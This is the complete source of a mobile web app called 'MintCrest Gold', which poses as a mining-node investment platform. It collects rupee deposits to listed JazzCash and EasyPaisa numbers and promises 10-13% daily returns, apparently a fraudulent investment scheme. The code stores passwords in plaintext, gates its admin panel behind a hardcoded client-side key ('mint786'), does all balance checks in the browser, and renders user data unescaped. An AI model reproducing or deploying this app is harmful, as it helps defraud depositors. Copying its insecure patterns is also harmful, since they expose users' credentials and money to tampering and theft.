<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Global Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --accent: #3b82f6; }
        .light { --bg: #f8fafc; --card: #ffffff; --text: #0f172a; --border: #e2e8f0; --accent: #2563eb; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; padding-bottom: 100px; overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); }
        .page { display: none; animation: slideUp 0.4s ease forwards; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .btn-prime { background: linear-gradient(135deg, #1e40af, #3b82f6); color: white; border-radius: 16px; font-weight: 800; transition: 0.2s; }
        .btn-prime:active { transform: scale(0.95); }
        input, textarea, select { background: var(--card); border: 1px solid var(--border); color: var(--text); padding: 14px; border-radius: 14px; width: 100%; outline: none; font-size: 13px; }
        .nav-active { color: var(--accent); transform: scale(1.1); opacity: 1 !important; }
        .animate-marquee { display: inline-block; animation: marquee 15s linear infinite; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body>

    <div id="lock-screen" class="fixed inset-0 z-[1000000] bg-[var(--bg)] hidden flex flex-col items-center justify-center p-8 text-center">
        <h1 id="lock-title" class="text-2xl font-black uppercase text-red-500 mb-2">System Optimization</h1>
        <p id="lock-msg" class="text-[10px] font-bold opacity-60 uppercase tracking-widest leading-relaxed">System is currently being updated. Please check back later.</p>
    </div>

    <header class="p-4 flex justify-between items-center sticky top-0 bg-[var(--bg)]/80 backdrop-blur-md border-b border-[var(--border)] z-[5000]">
        <div class="flex items-center gap-2">
            <div onclick="adminTap()" class="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center font-black text-white italic shadow-lg">M</div>
            <span class="font-black text-xs uppercase tracking-tighter">MintCrest <span class="text-blue-500">Gold</span></span>
        </div>
        <div class="flex items-center gap-3">
            <div id="top-bal" class="text-[10px] font-black bg-blue-600/10 text-blue-500 px-4 py-1.5 rounded-full border border-blue-500/20 italic">₨ 0</div>
            <button onclick="logout()" class="w-8 h-8 glass rounded-full flex items-center justify-center text-xs shadow-md">🚪</button>
        </div>
    </header>

    <section id="auth-ui" class="fixed inset-0 z-[20000] bg-[var(--bg)] flex flex-col items-center justify-center p-8 text-center">
        <h1 class="text-2xl font-black italic tracking-tighter mb-8 uppercase text-blue-500">Initialize Node</h1>
        <div class="w-full max-w-[300px] space-y-4">
            <input type="text" id="user-name" placeholder="Username" class="text-center font-bold">
            <input type="password" id="user-pass" placeholder="Password" class="text-center font-bold">
            <button onclick="login()" class="w-full p-4 btn-prime uppercase text-[10px] tracking-widest shadow-xl">Authorize Access</button>
        </div>
    </section>

    <main id="app-ui" class="hidden p-4 space-y-6">
        
        <div id="p-home" class="page active-page space-y-6">
            <div class="bg-blue-600/5 border border-blue-500/10 p-2 rounded-xl overflow-hidden whitespace-nowrap">
                <p id="v-news" class="animate-marquee inline-block text-[8px] font-black uppercase text-blue-400 italic">Welcome! System active. Minimum Deposit: ₨ 200 | Withdrawal: ₨ 100.</p>
            </div>

            <div class="p-8 rounded-[2.5rem] bg-gradient-to-br from-blue-700 to-blue-900 text-white shadow-2xl relative overflow-hidden">
                <p class="text-[10px] font-black uppercase opacity-60 tracking-widest">Available Liquidity</p>
                <h2 class="text-4xl font-black tracking-tighter mt-1" id="v-bal">₨ 0.00</h2>
                <div class="mt-6 flex justify-between items-center bg-black/20 p-4 rounded-2xl backdrop-blur-md">
                    <span class="text-[8px] font-bold uppercase italic">Node Status: Online</span>
                    <button onclick="copyRef()" class="bg-white text-blue-800 px-4 py-2 rounded-xl text-[8px] font-black uppercase">Copy Ref Link</button>
                </div>
            </div>

            <h3 class="text-[10px] font-black uppercase opacity-40 italic tracking-widest">Mining Infrastructure</h3>
            <div id="plans-grid" class="grid grid-cols-1 gap-4"></div>
        </div>

        <div id="p-wallet" class="page space-y-6">
            <div class="space-y-3">
                <div class="glass p-5 rounded-[2rem] border-l-4 border-red-600 flex justify-between items-center">
                    <div><p class="text-[8px] font-black text-red-500 uppercase">JazzCash</p><p class="text-lg font-black tracking-widest">03705519562</p></div>
                    <button onclick="copyText('03705519562')" class="text-[8px] bg-white/5 px-3 py-2 rounded-lg font-bold">COPY</button>
                </div>
                <div class="glass p-5 rounded-[2rem] border-l-4 border-green-500 flex justify-between items-center">
                    <div><p class="text-[8px] font-black text-green-500 uppercase">EasyPaisa</p><p class="text-lg font-black tracking-widest">03379827882</p></div>
                    <button onclick="copyText('03379827882')" class="text-[8px] bg-white/5 px-3 py-2 rounded-lg font-bold">COPY</button>
                </div>
            </div>
            <div class="glass p-6 rounded-[2.5rem] space-y-4">
                <input type="number" id="dep-amt" placeholder="Amount (Min: ₨ 200)">
                <input type="text" id="dep-tid" placeholder="Transaction ID (TID)">
                <input type="file" id="dep-file" accept="image/*" class="hidden" onchange="previewImg(this)">
                <label for="dep-file" class="w-full p-4 border-2 border-dashed border-[var(--border)] rounded-xl flex flex-col items-center justify-center cursor-pointer">
                    <span id="file-label" class="text-[8px] font-black uppercase opacity-50">Upload Screenshot Proof</span>
                    <img id="img-preview" class="hidden w-full h-32 object-cover rounded-xl mt-2 border border-blue-500/20">
                </label>
                <button onclick="submitDep()" class="w-full p-4 btn-prime uppercase text-[10px]">Confirm Funding</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-6">
            <h3 class="text-[10px] font-black uppercase opacity-40 text-center italic tracking-widest">Payout Processing (10% Tax)</h3>
            <div class="glass p-6 rounded-[2.5rem] space-y-4">
                <select id="w-method">
                    <option value="">Select Gateway</option>
                    <option value="JazzCash">JazzCash</option>
                    <option value="EasyPaisa">EasyPaisa</option>
                </select>
                <input type="number" id="w-amt" placeholder="Amount (Min: ₨ 100)">
                <input type="text" id="w-acc" placeholder="Account Number">
                <input type="text" id="w-name" placeholder="Account Holder Name">
                <button onclick="submitWith()" class="w-full p-4 btn-prime uppercase text-[10px]">Process Withdrawal</button>
            </div>
        </div>

        <div id="p-history" class="page space-y-4">
            <h3 class="text-[10px] font-black uppercase opacity-40 italic tracking-widest">Node Operations Log</h3>
            <div id="history-list" class="space-y-3"></div>
        </div>

    </main>

    <div id="admin-ui" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-4 md:p-8">
        <div class="flex justify-between items-center mb-8 sticky top-0 bg-[#010409]/90 backdrop-blur-md py-4 z-10 border-b border-blue-500/20">
            <h2 class="text-xl font-black text-blue-500 uppercase italic">Admin Node</h2>
            <button onclick="closeAdmin()" class="bg-red-500 text-white px-6 py-2 rounded-xl text-[10px] font-black uppercase">Exit</button>
        </div>
        <div id="adm-requests-list" class="space-y-4 pb-20"></div>
    </div>

    <nav id="bottom-nav" class="hidden fixed bottom-0 w-full glass border-t border-[var(--border)] p-4 flex justify-around items-center rounded-t-[2.5rem] z-[4000]">
        <button onclick="changePage('home')" id="n-home" class="nav-active opacity-40 flex flex-col items-center gap-1">🏠<span class="text-[7px] font-black uppercase">Home</span></button>
        <button onclick="changePage('wallet')" id="n-wallet" class="opacity-40 flex flex-col items-center gap-1">📥<span class="text-[7px] font-black uppercase">Fund</span></button>
        <button onclick="changePage('withdraw')" id="n-withdraw" class="opacity-40 flex flex-col items-center gap-1">📤<span class="text-[7px] font-black uppercase">Payout</span></button>
        <button onclick="changePage('history')" id="n-history" class="opacity-40 flex flex-col items-center gap-1">📜<span class="text-[7px] font-black uppercase">Logs</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.appspot.com", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let tapCount = 0;

        // --- AUTH ---
        async function login() {
            const n = document.getElementById('user-name').value.trim().toLowerCase();
            const p = document.getElementById('user-pass').value.trim();
            if(!n || !p) return alert("Credentials required.");
            const ref = db.collection("users").doc(n);
            const d = await ref.get();
            if(!d.exists) {
                await ref.set({ name: n, password: p, balance: 0, time: Date.now() });
            } else if(d.data().password !== p) {
                return alert("Access denied: Wrong password.");
            }
            localStorage.setItem('mc_user', n);
            enterApp(n);
        }

        function logout() { localStorage.removeItem('mc_user'); location.reload(); }

        function enterApp(n) {
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            db.collection("users").doc(n).onSnapshot(d => {
                user = d.data();
                document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
                document.getElementById('top-bal').innerText = "₨ " + (user.balance || 0).toLocaleString();
            });
            syncLogs(n);
            renderPlans();
        }

        function syncLogs(n) {
            db.collection("requests").where("user", "==", n).orderBy("time", "desc").limit(10).onSnapshot(s => {
                const list = document.getElementById('history-list'); list.innerHTML = '';
                s.forEach(doc => {
                    const x = doc.data();
                    list.innerHTML += `<div class="glass p-4 rounded-2xl flex justify-between items-center text-[10px] font-bold border-l-4 ${x.status==='approved'?'border-green-500':'border-yellow-500'}">
                        <div><p class="uppercase">${x.type}</p><p class="text-[7px] opacity-40">${new Date(x.time).toLocaleString()}</p></div>
                        <div class="text-right"><p>₨ ${x.amount||0}</p><p class="text-[7px] uppercase italic">${x.status}</p></div>
                    </div>`;
                });
            });
        }

        // --- NODES/PLANS WITH BALANCE SECURITY ---
        const PLANS = [
            { id: "S1", name: "Bronze Node", price: 500, daily: 50 },
            { id: "S2", name: "Silver Node", price: 1000, daily: 120 },
            { id: "S3", name: "Gold Node", price: 2000, daily: 250 },
            { id: "S4", name: "Diamond Node", price: 5000, daily: 650 }
        ];

        function renderPlans() {
            const grid = document.getElementById('plans-grid');
            grid.innerHTML = '';
            PLANS.forEach(p => {
                grid.innerHTML += `<div class="glass p-6 rounded-[2.5rem] border-l-4 border-blue-500 flex justify-between items-center">
                    <div><h4 class="font-black text-xs uppercase">${p.name}</h4><p class="text-[10px] text-blue-400 font-bold mt-1">Cost: ₨ ${p.price}</p></div>
                    <button onclick="buyPlan('${p.name}', ${p.price}, ${p.daily})" class="btn-prime px-6 py-3 text-[8px]">REQUEST NODE</button>
                </div>`;
            });
        }

        async function buyPlan(pName, price, daily) {
            // STRICT BALANCE CHECK
            if(user.balance < price) return alert("Insufficient balance to request this node.");
            
            if(confirm(`Send activation request for ${pName} costing ₨ ${price}?`)) {
                await db.collection("requests").add({ 
                    user: user.name, type: "plan_activation", plan: pName, 
                    amount: price, daily: daily, status: "pending", time: Date.now() 
                });
                alert("Request submitted for administrative approval.");
            }
        }

        // --- MONEY OPS ---
        function previewImg(i) { if (i.files && i.files[0]) { const r = new FileReader(); r.onload = e => { document.getElementById('img-preview').src = e.target.result; document.getElementById('img-preview').classList.remove('hidden'); }; r.readAsDataURL(i.files[0]); } }
        async function submitDep() {
            const a = parseInt(document.getElementById('dep-amt').value);
            const tid = document.getElementById('dep-tid').value;
            const f = document.getElementById('dep-file').files[0];
            if(!a || a < 200 || !tid || !f) return alert("Provide valid amount (Min ₨ 200) and proof.");
            const r = new FileReader(); r.readAsDataURL(f);
            r.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: a, tid: tid, proof: r.result, type: "deposit", status: "pending", time: Date.now() });
                alert("Deposit log submitted."); location.reload();
            };
        }

        async function submitWith() {
            const a = parseInt(document.getElementById('w-amt').value);
            const m = document.getElementById('w-method').value;
            const ac = document.getElementById('w-acc').value;
            const nm = document.getElementById('w-name').value;
            if(!a || a < 100 || !m || !ac || !nm) return alert("Minimum ₨ 100 withdrawal required.");
            if(a > user.balance) return alert("Insufficient balance.");
            const tax = a * 0.10; const net = a - tax;
            if(confirm(`Total: ₨ ${a}\nTax (10%): ₨ ${tax}\nNet Receive: ₨ ${net}`)) {
                await db.collection("users").doc(user.name).update({ balance: firebase.firestore.FieldValue.increment(-a) });
                await db.collection("requests").add({ user: user.name, amount: a, tax: tax, receive: net, method: m, account: ac, holder: nm, type: "withdrawal", status: "pending", time: Date.now() });
                alert("Payout request recorded."); location.reload();
            }
        }

        // --- ADMIN CONTROLS ---
        function adminTap() { tapCount++; if(tapCount >= 5) { if(prompt("Auth Key:")==="mint786") { document.getElementById('admin-ui').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        function syncAdm() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(s => {
                const list = document.getElementById('adm-requests-list'); list.innerHTML = '';
                s.forEach(doc => {
                    const r = doc.data();
                    let info = r.type === 'plan_activation' ? `Plan: ${r.plan} (₨ ${r.amount})` : 
                               r.type === 'withdrawal' ? `Pay: ₨ ${r.receive} (Tax: ₨ ${r.tax})` : `Dep: ₨ ${r.amount}`;
                    list.innerHTML += `<div class="glass p-6 rounded-3xl border-l-4 border-blue-500">
                        <div class="flex gap-4 items-center">
                            ${r.proof ? `<img src="${r.proof}" class="w-16 h-16 rounded-xl object-cover">` : ''}
                            <div class="flex-1 text-[10px] font-bold uppercase">
                                <p>${r.user} | ${r.type.replace('_',' ')}</p>
                                <p class="text-blue-400 font-black mt-1">${info}</p>
                            </div>
                            <button onclick="approve('${doc.id}', '${r.user}', '${r.type}', ${r.amount}, ${r.daily || 0})" class="bg-blue-600 px-4 py-2 rounded-lg text-[8px] font-black">APPROVE</button>
                        </div>
                    </div>`;
                });
            });
        }

        async function approve(id, u, type, amt, daily) {
            const ref = db.collection("users").doc(u);
            const userSnapshot = await ref.get();
            const userData = userSnapshot.data();

            if(type === 'deposit') {
                await ref.update({ balance: firebase.firestore.FieldValue.increment(amt) });
            } else if(type === 'plan_activation') {
                // Secondary check in admin panel
                if(userData.balance < amt) return alert("User no longer has sufficient balance.");
                await ref.update({ balance: firebase.firestore.FieldValue.increment(-amt), activePlan: true, dailyYield: daily });
            }
            await db.collection("requests").doc(id).update({ status: 'approved' });
            alert("Approval complete.");
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('nav-active')); document.getElementById('n-'+p).classList.add('nav-active'); }
        function copyText(t) { navigator.clipboard.writeText(t); alert("Number Copied."); }
        function copyRef() { const link = window.location.origin + window.location.pathname + "?ref=" + user.name; copyText(link); }

        window.onload = () => { if(localStorage.getItem('mc_user')) enterApp(localStorage.getItem('mc_user')); }
    </script>
</body>
</html>
